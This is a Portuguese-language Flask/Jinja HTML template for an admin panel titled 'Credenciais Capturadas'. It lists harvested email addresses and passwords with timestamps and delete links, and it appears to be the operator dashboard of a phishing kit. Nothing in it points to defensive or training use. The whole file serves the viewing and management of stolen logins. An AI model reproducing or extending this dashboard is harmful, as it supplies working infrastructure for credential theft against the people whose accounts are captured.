<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Admin</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
</head>
<body class="dashboard">
    <div class="panel">
        <h2>Credenciais Capturadas</h2>
        <table>
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Senha</th>
                    <th>Data/Hora</th>
                    <th>Ações</th>
                </tr>
            </thead>
            <tbody>
                {% for dado in dados %}
                <tr>
                    <td>{{ dado[1] }}</td>
                    <td>{{ dado[2] }}</td>
                    <td>{{ dado[3] }}</td>
                    <td>
                        <a href="/delete/{{ dado[0] }}" onclick="return confirm('Apagar esta credencial?')">🗑️</a>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        <div style="margin-top: 20px;">
            <a href="/logout">Sair do painel</a>
        </div>
    </div>
</body>
</html>
